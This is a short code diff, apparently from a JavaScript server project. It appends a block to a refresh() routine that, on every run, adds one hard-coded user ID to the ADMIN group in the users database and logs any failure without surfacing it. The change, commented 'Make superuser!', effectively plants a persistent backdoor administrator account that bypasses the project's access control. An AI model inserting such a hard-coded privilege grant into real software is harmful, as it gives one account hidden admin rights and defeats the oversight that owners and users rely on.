@@ -524,6 +524,24 @@ async function refresh() {
 
 	await createPerforceManagers();
 
+
+	// Make superuser!
+
+	const query = {
+		id: '749007095914954799',
+	};
+	
+	const update = {
+		$addToSet: { 
+			groups: GROUP.ADMIN,
+		},
+	};
+
+	db.users().findOneAndUpdate( query, update)
+		.catch((e) => {
+			log.error(e);
+		});
+
 	log.info('Refresh finished');
 	bIsReady = true;
 }
